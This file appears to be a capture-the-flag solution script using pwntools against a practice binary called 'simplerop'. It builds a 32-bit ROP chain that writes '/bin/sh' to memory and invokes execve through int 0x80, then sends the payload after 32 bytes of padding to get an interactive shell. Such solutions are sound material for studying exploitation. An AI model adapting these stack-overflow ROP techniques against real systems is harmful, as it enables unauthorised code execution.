#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # ./simplerop
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

pop_edx_ecx_ebx = 0x0806e850

rop = ''

# write /bin/sh\x00 to 0x08048000 + 0x000a3060
rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
#  rop += '//bi'
rop += '/bin'
rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
rop += rebase_0(0x000a3060)
rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
rop += '/sh\x00'
rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
rop += rebase_0(0x000a3064)
rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
print "[+]write /bin/sh\x00 to 0x08048000 + 0x000a3060"

#  rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
#  rop += p(0x00000000)
#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
#  rop += rebase_0(0x000a3068)
#  rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
#  rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
#  rop += rebase_0(0x000a3060)
#  rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; 
#  rop += rebase_0(0x000a3068)
#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
#  rop += rebase_0(0x000a3068)

# set ebx -> /bin/sh\x00, ecx = edx = 0
rop += pack('I', pop_edx_ecx_ebx)
rop += p(0)
rop += p(0)
rop += rebase_0(0x000a3060)
print "[+]set ebx -> /bin/sh\x00, ecx = edx = 0"

rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
rop += p(0x0000000b)
rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; 
assert len(rop) <= 100 - 32

io = process("./simplerop")

payload = cyclic(32) + rop
io.sendlineafter(" :", payload)

io.interactive()
io.close()

